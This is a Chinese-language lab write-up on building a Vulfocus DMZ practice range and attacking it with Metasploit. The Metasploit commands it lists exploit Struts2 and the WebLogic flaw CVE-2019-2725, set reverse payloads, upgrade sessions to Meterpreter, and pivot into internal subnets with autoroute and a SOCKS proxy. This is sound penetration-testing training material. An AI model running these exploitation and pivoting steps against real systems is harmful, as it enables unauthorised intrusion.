# DMZ复现环境搭建

## 环境环境搭建

### 启动容器问题

vulfocus容器，这里出现过一个问题，在vulfocus里不论是下载镜像还是搭建网卡都会卡顿或者失败，原因是可能是在某些操作中取消了宿主机的挂载进程，导致在vulfocus不能随意修改宿主机的容器，解决方法是将宿主机的挂载进程打开

![alt text](images2/image-5.png)

能够成功下载镜像和配置网卡

![alt text](images2/image-6.png)

### DMZ环境搭建

网卡名称任意，ip不与宿主机重复即可

![alt text](images2/image-7.png)

由于系统场景商店已经下线，因此只能自己编排，可以在容器文件中找到DMZ需要的镜像并通过vulfocus GUI导入

![alt text](images2/image-8.png)

![alt text](images2/image-9.png)

![alt text](images2/image-10.png)

在场景管理中搭建网络拓扑

![alt text](images2/image-11.png)

发布场景后在场景页面启动，其中访问地址ip是错的，端口正确

![alt text](images2/image-12.png)

### DMZ入口靶标

在攻击机更新和初始化metasploit

```java
sudo apt install -y metasploit-framework
sudo msfdb init
```

![alt text](images2/image-13.png)

使用`msfconsole`启动，并查看数据库连接情况并且创建工作区进行攻击

![alt text](images2/image-14.png)

搜索漏洞相关信息
`search struts2 type:exploit
search S2-059 type:exploit`

使用`info id`查看相关漏洞信息

使用`use id`可以指定exp

![alt text](images2/image-15.png)

使用`show options`能够看见一些参数的配置

![alt text](images2/image-16.png)

使用`show payloads`能够查看可以使用的payload，一共是74条

![alt text](images2/image-19.png)

选取一个payload并根据本地环境构造一个攻击payload(在后续重新启动msf时候，这个payload使用不了，需要重新设置，选择新的payload)

```python

set payload payload/generic/ssh/interact  #设置payload
set RHOSTS 192.168.249.5  #靶机IP
set RPORT  58251    #靶机目标端口  
set LHOST  192.168.249.8   #攻击者主机IP 

```

![alt text](images2/image-18.png)

再次使用`show options`查看参数是否配置正确

![alt text](images2/image-20.png)

![alt text](images2/image-21.png)

使用`session`命令查看列表，看见序号为1，因此可以该序号打开`shell`执行命令

![alt text](images2/image-22.png)

![alt text](images2/image-23.png)

获取到DMZ入口靶标flag

### 内部网靶标

使用`ctrl-z`将session放入后台

对要攻击的目标进行扫描

`db_nmap -p 58251,8080,22 192.168.249.5 -A -T4 -n`,端口是自己设置的靶场端口

![alt text](images2/image-26.png)

`hosts`查看扫描结果

![alt text](images2/image-25.png)

![alt text](images2/image-27.png)

升级shell为Meterpreter`sessions -u 1`，序号是前面的sessions列表里的序号

![alt text](images2/image-28.png)

升级后获得了权限

![alt text](images2/image-29.png)

通过序号获得权限，发现了新网段192.168.161.0/24(内部网段)

![alt text](images2/image-30.png)

使用autoroute建立新的路由进行访问

```python
run autoroute -s 192.168.161.0/24
run autoroute -p
```

![alt text](images2/image-31.png)

![alt text](images2/image-32.png)

搜索相应的板块并且找到tcp板块

```python
search portscan
use auxiliary/scanner/portscan/tcp
```

退出sessions2

![alt text](images2/image-33.png)

![alt text](images2/image-34.png)

设置参数

```python
set RHOSTS 192.168.161.2-254 #网关是168.168.161.1，因此只需要扫描剩下的ip
set PORTS 7001 #为了加快扫描速度指定扫描端口为7001，这里也可以不指定，但会慢很多
set THREADS 10 #多线程加快扫描速度
```

`run`扫描

![alt text](images2/image-35.png)

使用hosts查看扫描结果

![alt text](images2/image-36.png)

搜索并使用另外一个 socks_proxy 模块,参数不用做修改

`search socks_proxy`

![alt text](images2/image-37.png)

启动服务器

![alt text](images2/image-38.png)

另起shell检查1080端口情况

![alt text](images2/image-39.png)

修改配置文件中socks代理为socks5 127.0.0.1 1080

`sudo vim /etc/proxychains4.conf`

![alt text](images2/image-42.png)

扫描均为无响应filter

![alt text](images2/image-41.png)

分别curl三个ip

![alt text](images2/image-40.png)

![alt text](images2/image-43.png)

![alt text](images2/image-44.png)

均显示404 not found说明网络层能访问，只是获取不了信息

#### 内网第一层靶标

查询漏洞

```python
search cve-2019-2725
use 0
show options
```

同样设置根据本地情况设置参数执行，端口7001是攻入内网的端口，LHOST是攻击机IP，RHOSTS是内网靶标IP

![alt text](images2/image-45.png)

依次更换RHOSTS，将第一层三个靶标拿下

![alt text](images2/image-46.png)

![alt text](images2/image-47.png)

获取到内网三个shell

![alt text](images2/image-49.png)

进度只剩最后一层靶标

![alt text](images2/image-48.png)

#### 内网第二层靶标

执行`sessions -c "ifconfig" -i 2,3,4`寻找持有双网卡的靶机，发现session为4

![alt text](images2/image-50.png)

看见第二个网段192.168.162.0/24，尝试使用autoroute建立新的路由进行访问

![alt text](images2/image-51.png)

由于不知道该网段的入口，因此需要升级权限进入该网段，使用`sessions -u 4`升级权限，执行`ip config`

![alt text](images2/image-52.png)

至此已经找到了入口，可以通过该入口扫描网段，然而过滤扫描该网段`open`的端口，均不存在

![alt text](images2/image-53.png)

![alt text](images2/image-54.png)

使用`nc`命令查询能连接的主机，但是失败了

![alt text](images2/image-56.png)

## 问题

数据库连接异常，靶场搭建异常，防火墙，连通性问题，路由问题